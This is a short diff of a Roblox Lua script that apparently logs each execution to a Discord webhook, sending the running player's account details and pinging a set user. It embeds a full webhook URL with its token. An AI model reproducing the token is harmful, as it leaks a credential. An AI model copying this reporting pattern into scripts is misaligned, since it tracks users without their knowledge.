@@ -1,5 +1,5 @@
 local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs" -- your webhook
-_G.Discord_UserID = "991" -- ID To Ping on every execution, blank if no one wants to be pinged.
+_G.Discord_UserID = "anya.dev" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
 local player = game:GetService"Players".LocalPlayer
 local joinTime = os.time() - (player.AccountAge*86400)
@@ -128,7 +128,7 @@ local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9
 _G.Discord_UserID = "991" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
 local msg = {
-    ["username"] = "log",
+    ["username"] = "ENGLISH",
     ["avatar_url"] = "",
     ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("@".._G.Discord_UserID.."") or " ",
     ["embeds"] = {
